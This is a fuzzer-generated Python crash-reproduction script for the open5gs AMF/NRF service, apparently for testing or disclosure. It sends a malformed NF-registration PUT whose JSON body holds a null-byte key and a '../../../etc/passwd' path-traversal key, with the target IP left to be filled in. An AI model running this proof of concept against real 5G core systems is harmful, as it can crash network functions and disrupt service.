#!/usr/bin/env python3
# Crash reproduction for open5gs-amf (low)
# Detected: Sat May  9 06:35:12 2026
import http.client, json

host, port = '127.0.0.1', 80  # Update to target IP
method = 'PUT'
path = '/nnrf-nfm/v1/nf-instances/UDM-fuzz-6782'
body = b'{"nfInstanceId": "AMF-instance-001", "nfType": "AMF", "nfStatus": "REGISTERED", "ipv4Addresses": ["172.23.0.20"], "fqdn": "UNKNOWN_TYPE", "priority": 1, "capacity": 100, "load": 0, "nfServices": [{"serviceInstanceId": "namf-comm-001", "serviceName": "namf-comm", "versions": [{"apiVersionInUri": "v1", "apiFullVersion": "1.0.0"}], "scheme": "http", "nfServiceStatus": "REGISTERED", "ipEndPoints": [{"ipv4Address": "172.23.0.20", "port": 7777}]}], "n1MessageContainer": null, "\\u0000null_byte_467": "injected", "../../../etc/passwd": "path_traversal"}'
conn = http.client.HTTPConnection(host, port, timeout=10)
headers = {'Content-Type': 'application/json'}
if body:
    conn.request(method, path, body=body, headers=headers)
else:
    conn.request(method, path, headers=headers)
resp = conn.getresponse()
print(f'Status: {resp.status}')
print(f'Body: {resp.read()[:500]}')
